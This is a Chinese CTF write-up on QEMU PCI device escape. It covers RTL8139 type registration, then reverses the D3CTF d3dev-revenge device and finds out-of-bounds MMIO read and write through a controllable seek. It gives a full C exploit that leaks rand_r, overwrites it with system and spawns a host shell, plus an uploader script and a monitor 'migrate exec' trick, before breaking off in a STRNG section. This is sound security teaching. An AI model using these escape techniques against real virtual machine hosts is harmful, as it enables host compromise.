    uint8_t  Config5;

    uint8_t  clock_enabled;
    uint8_t  bChipCmdState;

    uint16_t MultiIntr;

    uint16_t BasicModeCtrl;
    uint16_t BasicModeStatus;
    uint16_t NWayAdvert;
    uint16_t NWayLPAR;
    uint16_t NWayExpansion;

    uint16_t CpCmd;
    uint8_t  TxThresh;

    NICState *nic;
    NICConf conf;

    /* C ring mode */
    uint32_t   currTxDesc;

    /* C+ mode */
    uint32_t   cplus_enabled;

    uint32_t   currCPlusRxDesc;
    uint32_t   currCPlusTxDesc;

    uint32_t   RxRingAddrLO;
    uint32_t   RxRingAddrHI;

    EEprom9346 eeprom;

    uint32_t   TCTR;
    uint32_t   TimerInt;
    int64_t    TCTR_base;

    /* Tally counters */
    RTL8139TallyCounters tally_counters;

    /* Non-persistent data */
    uint8_t   *cplus_txbuffer;
    int        cplus_txbuffer_len;
    int        cplus_txbuffer_offset;

    /* PCI interrupt timer */
    QEMUTimer *timer;

    MemoryRegion bar_io;
    MemoryRegion bar_mem;

    /* Support migration to/from old versions */
    int rtl8139_mmio_io_addr_dummy;
};

```



#### type 注册

```c
static const TypeInfo rtl8139_info = {
    .name          = TYPE_RTL8139,
    .parent        = TYPE_PCI_DEVICE,
    .instance_size = sizeof(RTL8139State),
    .class_init    = rtl8139_class_init,
    .instance_init = rtl8139_instance_init,
    .interfaces = (InterfaceInfo[]) {
        { INTERFACE_CONVENTIONAL_PCI_DEVICE },
        { },
    },
};

static void rtl8139_register_types(void)
{
    type_register_static(&rtl8139_info);
}

type_init(rtl8139_register_types)

```

```c
type_init(rtl8139_register_types)
	module_init(rtl8139_register_types, MODULE_INIT_QOM)[do_qemu_init+rtl8139_register_types()]
		register_module_init(rtl8139_register_types, MODULE_INIT_QOM)
    		ModuleEntry->init = rtl8139_register_types
			e->type = MODULE_INIT_QOM
```

`module_call_init(MODULE_INIT_QOM);` 时

```c
module_call_init(MODULE_INIT_QOM)
	rtl8139_register_types()
		type_register_static(&rtl8139_info)
			type_register(&rtl8139_info)
				type_register_internal(&rtl8139_info)
    				type_table_add(type_new(&rtl8139_info))
```



#### class 初始化

```c
static void rtl8139_class_init(ObjectClass *klass, void *data)
{
    DeviceClass *dc = DEVICE_CLASS(klass);
    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);

    k->realize = pci_rtl8139_realize;
    k->exit = pci_rtl8139_uninit;
    k->romfile = "efi-rtl8139.rom";
    k->vendor_id = PCI_VENDOR_ID_REALTEK;
    k->device_id = PCI_DEVICE_ID_REALTEK_8139;
    k->revision = RTL8139_PCI_REVID; /* >=0x20 is for 8139C+ */
    k->class_id = PCI_CLASS_NETWORK_ETHERNET;
    dc->reset = rtl8139_reset;
    dc->vmsd = &vmstate_rtl8139;
    device_class_set_props(dc, rtl8139_properties);
    set_bit(DEVICE_CATEGORY_NETWORK, dc->categories);
}

```

```c
type_initialize()
	rtl8139_class_init()
    	object_initialize_with_type()
```



#### 设备初始化

```c
static void rtl8139_instance_init(Object *obj)
{
    RTL8139State *s = RTL8139(obj);

    device_add_bootindex_property(obj, &s->conf.bootindex,
                                  "bootindex", "/ethernet-phy@0",
                                  DEVICE(obj));
}
```

```c
device_init_func()
    qdev_device_add()
    	qdev_new() 
            object_new(TYPE_RTL8139)
                object_new_with_type()
                    object_initialize_with_type()
                        rtl8139_instance_init()
		qdev_realize()
    		object_property_set_bool()
    			object_property_set_qobject() 
    				object_property_set_qobject()
    					device_set_realized() 
    						pci_rtl8139_realize()
```



## CTF-PCI

QEMU PCI 出题思路：

1. 往 QEMU 源码里塞屎
2. 放个没改过的 QEMU 骗 0day



### D3CTF-d3dev-revenge

出题人写了一个 d3dev 设备塞进 QEMU，IDA 打开，函数搜 d3dev

```
do_qemu_init_pci_d3dev_register_types
d3dev_mmio_read	
d3dev_mmio_write
d3dev_pmio_read
pci_d3dev_register_types
d3dev_class_init
pci_d3dev_realize
d3dev_instance_init
d3dev_pmio_write
```



#### init

##### do_qemu_init_pci_d3dev_register_types

```c
void __cdecl do_qemu_init_pci_d3dev_register_types()
{
  register_module_init(pci_d3dev_register_types, MODULE_INIT_QOM_0);
}
```

注册 type，function 是 pci_d3dev_register_types

##### pci_d3dev_register_types

```c
void __cdecl pci_d3dev_register_types()
{
  type_register_static(&d3dev_info_27031);
}
```

`module_call_init(MODULE_INIT_QOM);` 时调用，其中 3dev_info_27031如下

```c
.data.rel.ro:0000000000B788A0 ; Function-local static variable
.data.rel.ro:0000000000B788A0 ; const TypeInfo_0 d3dev_info_27031
.data.rel.ro:0000000000B788A0 d3dev_info_27031 dq offset aD3dev        ; name
.data.rel.ro:0000000000B788A0                                         ; DATA XREF: pci_d3dev_register_types+4↑o
.data.rel.ro:0000000000B788A0                 dq offset env.tlb_table._anon_0+2E7Fh; parent ; "d3dev"
.data.rel.ro:0000000000B788A0                 dq 1300h                ; instance_size
.data.rel.ro:0000000000B788A0                 dq offset d3dev_instance_init; instance_init
.data.rel.ro:0000000000B788A0                 dq 0                    ; instance_post_init
.data.rel.ro:0000000000B788A0                 dq 0                    ; instance_finalize
.data.rel.ro:0000000000B788A0                 db 0                    ; abstract
.data.rel.ro:0000000000B788A0                 db 7 dup(0)
.data.rel.ro:0000000000B788A0                 dq 0                    ; class_size
.data.rel.ro:0000000000B788A0                 dq offset d3dev_class_init; class_init
.data.rel.ro:0000000000B788A0                 dq 0                    ; class_base_init
.data.rel.ro:0000000000B788A0                 dq 0                    ; class_finalize
.data.rel.ro:0000000000B788A0                 dq 0                    ; class_data
.data.rel.ro:0000000000B788A0                 dq offset interfaces_27030; interfaces
.data.rel.ro:0000000000B78908                 align 20h
```

有一个和 class 初始化相关的函数

```
d3dev_class_init
```

和设备初始化相关的函数

```
d3dev_instance_init
```



##### d3dev_class_init

```c
void __fastcall d3dev_class_init(ObjectClass_0 *a1, void *data)
{
  ObjectClass_0 *v2; // rax

  v2 = object_class_dynamic_cast_assert(
         a1,
         &env.tlb_table[1][115]._anon_0.dummy[31],
         "/home/eqqie/CTF/qemu-escape/qemu-source/qemu-3.1.0/hw/misc/d3dev.c",
         229,
         "d3dev_class_init");
  v2[1].unparent = pci_d3dev_realize;
  v2[1].properties = 0LL;
  LODWORD(v2[2].object_cast_cache[0]) = 0x11E82333;
  BYTE4(v2[2].object_cast_cache[0]) = 16;
  HIWORD(v2[2].object_cast_cache[0]) = 255;
}
```

class 初始化时调用，在这里也可以找到出题人：eqqie

`vendor_id = 0x2333`

`device_id = 0x11E8`

有一个和设备初始化相关的函数

```
pci_d3dev_realize
```



##### d3dev_instance_init

```c
void __fastcall d3dev_instance_init(Object_0 *obj)
{
  Object_0 *v1; // rbx
  unsigned int v2; // eax
  int v3; // eax

  v1 = object_dynamic_cast_assert(
         obj,
         "d3dev",
         "/home/eqqie/CTF/qemu-escape/qemu-source/qemu-3.1.0/hw/misc/d3dev.c",
         213,
         "d3dev_instance_init");
  v1[121].free = (ObjectFree *)&rand_r;
  if ( !LODWORD(v1[69].class) )
  {
    v2 = time(0LL);
    srand(v2);
    LODWORD(v1[120].parent) = rand();
    HIDWORD(v1[120].parent) = rand();
    LODWORD(v1[121].class) = rand();
    v3 = rand();
    LODWORD(v1[69].class) = 1;
    HIDWORD(v1[121].class) = v3;
  }
}
```



##### pci_d3dev_realize

```c
void __fastcall pci_d3dev_realize(PCIDevice_0 *pdev, Error_0 **errp)
{
  memory_region_init_io(
    (MemoryRegion_0 *)&pdev[1],
    &pdev->qdev.parent_obj,
    &d3dev_mmio_ops,
    pdev,
    "d3dev-mmio",
    0x800uLL);
  pci_register_bar(pdev, 0, 0, (MemoryRegion_0 *)&pdev[1]);
  memory_region_init_io(
    (MemoryRegion_0 *)&pdev[1].name[56],
    &pdev->qdev.parent_obj,
    &d3dev_pmio_ops,
    pdev,
    "d3dev-pmio",
    0x20uLL);
  pci_register_bar(pdev, 1, 1u, (MemoryRegion_0 *)&pdev[1].name[56]);
}
```

mmio：d3dev_mmio_ops

```c
.data.rel.ro:0000000000B78980 ; const MemoryRegionOps_0 d3dev_mmio_ops
.data.rel.ro:0000000000B78980 d3dev_mmio_ops  dq offset d3dev_mmio_read; read
.data.rel.ro:0000000000B78980                                         ; DATA XREF: pci_d3dev_realize+27↑o
.data.rel.ro:0000000000B78980                 dq offset d3dev_mmio_write; write
.data.rel.ro:0000000000B78980                 dq 0                    ; read_with_attrs
.data.rel.ro:0000000000B78980                 dq 0                    ; write_with_attrs
.data.rel.ro:0000000000B78980                 dd DEVICE_NATIVE_ENDIAN ; endianness
.data.rel.ro:0000000000B78980                 db 4 dup(0)
.data.rel.ro:0000000000B78980                 dd 0                    ; valid.min_access_size
.data.rel.ro:0000000000B78980                 dd 0                    ; valid.max_access_size
.data.rel.ro:0000000000B78980                 db 0                    ; valid.unaligned
.data.rel.ro:0000000000B78980                 db 7 dup(0)
.data.rel.ro:0000000000B78980                 dq 0                    ; valid.accepts
.data.rel.ro:0000000000B78980                 dd 0                    ; impl.min_access_size
.data.rel.ro:0000000000B78980                 dd 0                    ; impl.max_access_size
.data.rel.ro:0000000000B78980                 db 0                    ; impl.unaligned
.data.rel.ro:0000000000B78980                 db 3 dup(0)
.data.rel.ro:0000000000B78980                 db 4 dup(0)
.data.rel.ro:0000000000B789D0                 align 20h
```

只定义了 read、write

pmio：d3dev_pmio_ops

```c
.data.rel.ro:0000000000B78920 ; const MemoryRegionOps_0 d3dev_pmio_ops
.data.rel.ro:0000000000B78920 d3dev_pmio_ops  dq offset d3dev_pmio_read; read
.data.rel.ro:0000000000B78920                                         ; DATA XREF: pci_d3dev_realize+56↑o
.data.rel.ro:0000000000B78920                 dq offset d3dev_pmio_write; write
.data.rel.ro:0000000000B78920                 dq 0                    ; read_with_attrs
.data.rel.ro:0000000000B78920                 dq 0                    ; write_with_attrs
.data.rel.ro:0000000000B78920                 dd DEVICE_LITTLE_ENDIAN ; endianness
.data.rel.ro:0000000000B78920                 db 4 dup(0)
.data.rel.ro:0000000000B78920                 dd 0                    ; valid.min_access_size
.data.rel.ro:0000000000B78920                 dd 0                    ; valid.max_access_size
.data.rel.ro:0000000000B78920                 db 0                    ; valid.unaligned
.data.rel.ro:0000000000B78920                 db 7 dup(0)
.data.rel.ro:0000000000B78920                 dq 0                    ; valid.accepts
.data.rel.ro:0000000000B78920                 dd 0                    ; impl.min_access_size
.data.rel.ro:0000000000B78920                 dd 0                    ; impl.max_access_size
.data.rel.ro:0000000000B78920                 db 0                    ; impl.unaligned
.data.rel.ro:0000000000B78920                 db 3 dup(0)
.data.rel.ro:0000000000B78920                 db 4 dup(0)
.data.rel.ro:0000000000B78970                 align 20h
```

#### mmio

##### d3dev_mmio_read

```c
uint64_t __fastcall d3dev_mmio_read(d3devState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t v3; // rax
  unsigned int v4; // esi
  unsigned int v5; // ecx
  uint64_t result; // rax

  v3 = opaque->blocks[opaque->seek + (addr >> 3)];
  v4 = 0xC6EF3720;
  v5 = v3;
  result = v3 >> 32;
  do
  {
    LODWORD(result) = result - ((v5 + v4) ^ (opaque->key[3] + (v5 >> 5)) ^ (opaque->key[2] + 16 * v5));
    v5 -= (result + v4) ^ (opaque->key[1] + (result >> 5)) ^ (opaque->key[0] + 16 * result);
    v4 += 0x61C88647;
  }
  while ( v4 );
  if ( opaque->mmio_read_part )
  {
    opaque->mmio_read_part = 0;
    result = result;
  }
  else
  {
    opaque->mmio_read_part = 1;
    result = v5;
  }
  return result;
}
```

`void *opaque` 应该是 `d3devState *opaque`

d3devState 在 local type 中，先 synchronize to idb，然后把 `void *opaque` 改成 `d3devState *opaque`

```c
00000000 d3devState      struc ; (sizeof=0x1300, align=0x10, copyof_4545)
00000000 pdev            PCIDevice_0 ?
000008E0 mmio            MemoryRegion_0 ?
000009D0 pmio            MemoryRegion_0 ?
00000AC0 memory_mode     dd ?
00000AC4 seek            dd ?
00000AC8 init_flag       dd ?
00000ACC mmio_read_part  dd ?
00000AD0 mmio_write_part dd ?
00000AD4 r_seed          dd ?
00000AD8 blocks          dq 257 dup(?)
000012E0 key             dd 4 dup(?)
000012F0 rand_r          dq ?                    ; offset
000012F8                 db ? ; undefined
000012F9                 db ? ; undefined
000012FA                 db ? ; undefined
000012FB                 db ? ; undefined
000012FC                 db ? ; undefined
000012FD                 db ? ; undefined
000012FE                 db ? ; undefined
000012FF                 db ? ; undefined
00001300 d3devState      ends
```



```c
uint64_t __fastcall d3dev_mmio_read(d3devState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t v3; // rax
  unsigned int v4; // esi
  unsigned int v5; // ecx
  uint64_t result; // rax

  v3 = opaque->blocks[opaque->seek + (addr >> 3)];
  v4 = 0xC6EF3720;
  v5 = v3;
  result = v3 >> 32;
  do
  {
    LODWORD(result) = result - ((v5 + v4) ^ (opaque->key[3] + (v5 >> 5)) ^ (opaque->key[2] + 16 * v5));
    v5 -= (result + v4) ^ (opaque->key[1] + (result >> 5)) ^ (opaque->key[0] + 16 * result);
    v4 += 0x61C88647;
  }
  while ( v4 );
  if ( opaque->mmio_read_part )
  {
    opaque->mmio_read_part = 0;
    result = result;
  }
  else
  {
    opaque->mmio_read_part = 1;
    result = v5;
  }
  return result;
}
```

0xC6EF3720 一眼看出是 TEA 加密。

`v3 = opaque->blocks[opaque->seek + (addr >> 3)];` ，seek 在 d3dev_pmio_write 中可控

blocks 和 key 距离 0x808，blocks 里面 257（0x101） 个，`0x101*8=0x808`。

`rand_r[opaque->seek + (addr >> 3)];`

seek 可控，addr 可控，显然存在越界读，`blocks[0x103]` 就是 `opaque->rand_r`。



##### d3dev_mmio_write

```c
void __fastcall d3dev_mmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  __int64 v4; // rsi
  ObjectClass_0 **v5; // r11
  uint64_t v6; // rdx
  int v7; // esi
  uint32_t v8; // er10
  uint32_t v9; // er9
  uint32_t v10; // er8
  uint32_t v11; // edi
  unsigned int v12; // ecx
  uint64_t v13; // rax

  if ( size == 4 )
  {
    v4 = opaque->seek + (addr >> 3);
    if ( opaque->mmio_write_part )
    {
      v5 = &opaque->pdev.qdev.parent_obj.class + v4;
      v6 = val << 32;
      v7 = 0;
      opaque->mmio_write_part = 0;
      v8 = opaque->key[0];
      v9 = opaque->key[1];
      v10 = opaque->key[2];
      v11 = opaque->key[3];
      v12 = v6 + *(v5 + 694);
      v13 = (v5[347] + v6) >> 32;
      do
      {
        v7 -= 0x61C88647;
        v12 += (v7 + v13) ^ (v9 + (v13 >> 5)) ^ (v8 + 16 * v13);
        LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 >> 5)) ^ (v10 + 16 * v12)) + v13;
      }
      while ( v7 != 0xC6EF3720 );
      v5[347] = __PAIR64__(v13, v12);
    }
    else
    {
      opaque->mmio_write_part = 1;
      opaque->blocks[v4] = val;
    }
  }
}
```

`v4 = opaque->seek + (addr >> 3);`

`opaque->blocks[v4] = val;` 

seek 可控，addr 可控。和 d3dev_mmio_read 中的越界一样，这里存在越界写



#### pmio

##### d3dev_pmio_read

```c
uint64_t __fastcall d3dev_pmio_read(d3devState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax

  if ( addr > 0x18 )
    result = -1LL;
  else
    result = ((dword_7ADF30 + dword_7ADF30[addr]))(opaque);
  return result;
}
```

这里应该是个 switch

```c
.text:00000000004D7D04 d3dev = rdi                             ; d3devState *
.text:00000000004D7D04                 cmp     addr, 18h
.text:00000000004D7D08                 ja      short loc_4D7D20
.text:00000000004D7D0A                 lea     size, dword_7ADF30
.text:00000000004D7D11                 movsxd  rax, dword ptr [rdx+addr*4]
.text:00000000004D7D15                 add     rax, rdx
.text:00000000004D7D18                 db      3Eh
.text:00000000004D7D18                 jmp     rax
.text:00000000004D7D18 ; ---------------------------------------------------------------------------
.text:00000000004D7D1B                 align 20h
.text:00000000004D7D20
.text:00000000004D7D20 loc_4D7D20:                             ; CODE XREF: d3dev_pmio_read+8↑j
.text:00000000004D7D20                 mov     rax, 0FFFFFFFFFFFFFFFFh
.text:00000000004D7D27                 retn
.text:00000000004D7D27 ; ---------------------------------------------------------------------------
.text:00000000004D7D28                 align 10h
.text:00000000004D7D30                 mov     eax, [d3dev+12ECh]
.text:00000000004D7D36                 retn
.text:00000000004D7D36 ; ---------------------------------------------------------------------------
.text:00000000004D7D37                 align 20h
.text:00000000004D7D40                 mov     eax, [d3dev+0AC0h]
.text:00000000004D7D46                 retn
.text:00000000004D7D46 ; ---------------------------------------------------------------------------
.text:00000000004D7D47                 align 10h
.text:00000000004D7D50                 mov     eax, [d3dev+0AC4h]
.text:00000000004D7D56                 retn
.text:00000000004D7D56 ; ---------------------------------------------------------------------------
.text:00000000004D7D57                 align 20h
.text:00000000004D7D60                 mov     eax, [d3dev+12E0h]
.text:00000000004D7D66                 retn
.text:00000000004D7D66 ; ---------------------------------------------------------------------------
.text:00000000004D7D67                 align 10h
.text:00000000004D7D70                 mov     eax, [d3dev+12E4h]
.text:00000000004D7D76                 retn
.text:00000000004D7D76 ; ---------------------------------------------------------------------------
.text:00000000004D7D77                 align 20h
.text:00000000004D7D80                 mov     eax, [d3dev+12E8h]
```

```
0x0:memory_mode
0x8:seek
0xC:key[0]
0x10:key[1]
0x14:key[2]
0x18:key[3]
```

可以读 key，但是没必要，以为 key 可以自己设置。



##### d3dev_pmio_write

```c
void __fastcall d3dev_pmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  d3devState *v4; // rbp

  if ( addr == 8 )
  {
    if ( val <= 0x100 )
      opaque->seek = val;
  }
  else if ( addr > 8 )
  {
    if ( addr == 28 )
    {
      opaque->r_seed = val;
      v4 = (opaque + 4832);
      do
      {
        v4 = (v4 + 4);
        *(&v4[-1].rand_r + 3) = (opaque->rand_r)(&opaque->r_seed, 28LL, val, *&size);
      }
      while ( v4 != &opaque->rand_r );
    }
  }
  else if ( addr )
  {
    if ( addr == 4 )
    {
      *opaque->key = 0LL;
      *&opaque->key[2] = 0LL;
    }
  }
  else
  {
    opaque->memory_mode = val;
  }
}
```

`opaque->seek = val;` seek 可控

使用了函数指针 `opaque->rand_r`

`(opaque->rand_r)(&opaque->r_seed, 28LL, val, *&size);`

第一个参数 `r_seed` 可以在 `addr == 28` 时  `opaque->r_seed = val;` 控制

`addr == 4` 时，可以把 TEA 加密的 key 设成 `[0, 0, 0, 0]`



#### 思路

write 的数据被加密后储存，read 的数据是解密后的。所以 read 读到的数据加密后才是原数据，write 写的数据先解密再写进去的才是原数据。

1. 越界读泄露 `rand_r`，计算 libc 基址，`system` 地址
2. 越界写 `rand_r` 为 `system()`
3. 参数设为 `sh`，执行 `system(”sh")`



#### 调试

本地调试就直接把 exp 打包了

```shell
#!/bin/bash
rm ./rootfs/exp
musl-gcc exp.c -static -o ./rootfs/exp && strip ./rootfs/exp
cd rootfs
find . | cpio -o --format=newc > ../rootfs.img
cd ..
./launch.sh
```

launch.sh

```
#!/bin/sh
./qemu-system-x86_64 \
-monitor /dev/null \
-L pc-bios/ \
-m 128M \
-kernel vmlinuz \
-initrd rootfs.img \
-smp 1 \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet" \
-device d3dev \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic \
```

这里面 `-monitor /dev/null` 很关键，指定 monitor 命令来源，不加就成白给题了。比如 D3CTF-d3dev 和 [XNUCA2019-vexx](https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Pwn/vexx)

如果不加，可以按 `ctrl+a+c` 进 monitor，然后`migrate "exec:cat flag 1>&2"`

启动之后，如果用 gdb 调试，可以`ps -ax | grep qemu | awk NR==1'{print $1}'`查 QEMU PID 然后直接 attach。



#### 设备信息

lspci 看一眼

```
/ # lspci
00:01.0 Class 0601: 8086:7000
00:04.0 Class 0200: 8086:100e
00:00.0 Class 0600: 8086:1237
00:01.3 Class 0680: 8086:7113
00:03.0 Class 00ff: 2333:11e8
00:01.1 Class 0101: 8086:7010
00:02.0 Class 0300: 1234:1111
```

`vendor_id = 0x2333`

`device_id = 0x11E8`

所以 00:03.0 是 d3dev ，路径是 `/sys/devices/pci0000:00/0000:00:03.0`

```shell
/sys/devices/pci0000:00/0000:00:03.0 # ls
ari_enabled               firmware_node             resource
broken_parity_status      irq                       resource0
class                     local_cpulist             resource1
config                    local_cpus                revision
consistent_dma_mask_bits  modalias                  subsystem
d3cold_allowed            msi_bus                   subsystem_device
device                    numa_node                 subsystem_vendor
dma_mask_bits             power                     uevent
driver_override           remove                    vendor
enable                    rescan
```

在 `linux-5.11.5\Documentation\PCI\sysfs-pci.rst` 中可以知道 resource 存了地址，是只读的 ascii 文件。

```shell
/sys/devices/pci0000:00/0000:00:03.0 # cat resource
0x00000000febf1000 0x00000000febf17ff 0x0000000000040200  ==> resource0 MMIO
0x000000000000c040 0x000000000000c05f 0x0000000000040101  ==> resource1 PMIO
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
```

三列分别是起始地址、结束地址、flags，前两行分别对应 resource0 和 resource1

根据 flags 定义

```c
#define IORESOURCE_IO		0x00000100	/* PCI/ISA I/O ports */
#define IORESOURCE_MEM		0x00000200
```

resource0 MMIO，基址为 0xfebf1000

resource1 PMIO，基址为 0xc040



#### exp

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/io.h>

const uint64_t system_libc = 0x55410;
const uint64_t rand_r_libc = 0x4aeb0;
const uint32_t pmio_base = 0xc040;
uint64_t mmio_mem;
 
void mmio_write(uint64_t addr, uint64_t val){
    *(uint64_t *)(mmio_mem + addr) = val;
}
 
uint64_t mmio_read(uint64_t addr){
    return *(uint64_t *)(mmio_mem + addr);
}

void pmio_write(uint32_t addr, uint32_t val){
    outl(val, pmio_base+addr);
}

uint32_t pmio_read(uint32_t addr){
    return (uint32_t)inl(pmio_base+addr);
}

void tea_encrypt(uint32_t* v, uint32_t* k) { 
    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */  
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */  
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */  
    for (i=0; i < 32; i++) {                       /* basic cycle start */  
        sum += delta;  
        v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);  
        v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);  
    }                                              /* end cycle */  
    v[0]=v0; v[1]=v1;  
}  
void tea_decrypt(uint32_t* v, uint32_t* k) {  
    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* set up */  
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */  
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */  
    for (i=0; i<32; i++) {                         /* basic cycle start */  
        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);  
        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);  
        sum -= delta;  
    }                                              /* end cycle */  
    v[0]=v0; v[1]=v1;  
}  

int main(){
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR|O_SYNC);
    if(mmio_fd < 0){
        puts("[-] open failed");
    }
    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if(mmio_mem == MAP_FAILED){
        puts("[-] mmio failed");
    }
    if(iopl(3)){
        puts("[-] pmio failed");
    }
    uint32_t key[4] = {0,0,0,0};
    pmio_write(4, 0);//fuck key
    pmio_write(8, 0x100);//fuck seek
    uint64_t rand_r_addr = mmio_read(24);//leak
    tea_encrypt(&rand_r_addr,key);
    printf("[+] rand_r ==> %#lx\n", rand_r_addr);
    uint64_t libc_base = rand_r_addr - rand_r_libc;
    printf("[+] libc_base ==> %#lx\n", libc_base);
    uint64_t system_addr = libc_base + system_libc;
    printf("[+] system ==> %#lx\n", system_addr);
    tea_decrypt(&system_addr,key);
    mmio_write(24, system_addr);//fuck rand_r
    pmio_write(28, 0x6873);//system("sh");
    return 0;
}
```

musl-gcc 编译减少体积，方便上传到远程

```makefile
exp:
	musl-gcc exp.c -static -o exp && strip exp
clean:
	rm exp
```

本地可以直接打包，远程就 base64 传上去再解

```python
#!/usr/bin/env python2
# encoding: utf-8

from pwn import *
import base64
import sys
import os

os.system('make clean')
os.system('make')
f = open("exp", "rb")
exp = f.read()
f.close()
print(len(exp))
step = 0x200

r = remote('0.0.0.0',5555)
r.recvuntil('#')
r.sendline('')

log.info('uploading...')
for i in range(0,len(exp)/step+1):
    b64_exp = base64.b64encode(exp[step*i:step*(i+1)])
    r.recvuntil('#')
    r.sendline('echo %s >> /tmp/b64_exp'%b64_exp)
log.success('upload success')

r.recvuntil('#')
r.sendline('base64 -d /tmp/b64_exp > /tmp/exp')
r.recvuntil('#')
r.sendline('cd tmp')
r.recvuntil('#')
r.sendline('chmod 777 exp')

r.interactive()
```

```
[+] Opening connection to 0.0.0.0 on port 5555: Done
[*] uploading...
[+] upload success
[*] Switching to interactive mode
 chmod 777 exp
/tmp # $ ./exp
./exp
[+] rand_r ==> 0x7f49574feeb0
[+] libc_base ==> 0x7f49574b4000
[+] system ==> 0x7f4957509410.
sh: turning off NDELAY mode
$ ls
bin
dev
flag
launch.sh
lib
lib32
lib64
libx32
pc-bios
qemu-system-x86_64
qemu-system-x86_64.i64
rootfs.img
usr
vmlinuz
$ cat flag
d3ctf{h@v3_fun!!!}
$
```



### Blizzard CTF 2017-Sombra True Random Number Generator (STRNG)

#### STRNGState

```c
typedef struct {
    PCIDevice pdev;
    MemoryRegion mmio;
    MemoryRegion pmio;
    uint32_t addr;
    uint32_t regs[STRNG_MMIO_REGS];
    void (*srand)(unsigned int seed);
    int (*rand)(void);
    int (*rand_r)(unsigned int *seed);
} STRNGState;

```



#### 设备信息

```
root@ubuntu:/home/ubuntu# lspci
00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)
00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]
00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)
00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)
```

00:03.0 是出题人塞的屎

```
root@ubuntu:/sys/devices/pci0000:00/0000:00:03.0# ls
broken_parity_status      device         local_cpulist  remove     subsystem
class                     dma_mask_bits  local_cpus     rescan     subsystem_device
config                    enable         modalias       resource   subsystem_vendor
consistent_dma_mask_bits  firmware_node  msi_bus        resource0  uevent
d3cold_allowed            irq            power          resource1  vendor
```

看 resource

```
root@ubuntu:/home/ubuntu# lspci -v -s 00:03.0
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
        Subsystem: Red Hat, Inc Device 1100
        Physical Slot: 3
        Flags: fast devsel
        Memory at febf1000 (32-bit, non-prefetchable) [size=256]
        I/O ports at c050 [size=8]
```

```c
root@ubuntu:/sys/devices/pci0000:00/0000:00:03.0# cat resource
0x00000000febf1000 0x00000000febf10ff 0x0000000000040200  ==> resource0 MMIO
0x000000000000c050 0x000000000000c057 0x0000000000040101  ==> resource1 PMIO
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
```

三列分别是起始地址、结束地址、flags，前两行分别对应 resource0 和 resource1

resource0 MMIO，基址为 0xfebf1000，size 为 256

resource1 PMIO，基址为 0xc050



#### 调试

```shell
cat run.sh
#!/bin/sh
./qemu-system-x86_64 \
    -m 1G \
    -device strng \
    -hda my-disk.img \
    -hdb my-seed.img \
    -nographic \
    -L pc-bios/ \
    -enable-kvm \
    -device e1000,netdev=net0 \
    -netdev user,id=net0,hostfwd=tcp::5555-:22
```

ssh 连接，password：passw0rd

```shell
ssh ubuntu@127.0.0.1 -p 5555
```

传 exp

```shell
scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntu
```

exp 需要 root 权限运行

```shell
sudo su
```

启动之后，如果用 gdb 调试，可以`ps -ax | grep qemu | awk NR==1'{print $1}'`查 QEMU PID 然后直接 attach。



#### mmio

```c
static const MemoryRegionOps strng_mmio_ops = {
    .read = strng_mmio_read,
    .write = strng_mmio_write,
    .endianness = DEVICE_NATIVE_ENDIAN,
};
```



##### strng_mmio_write

```c
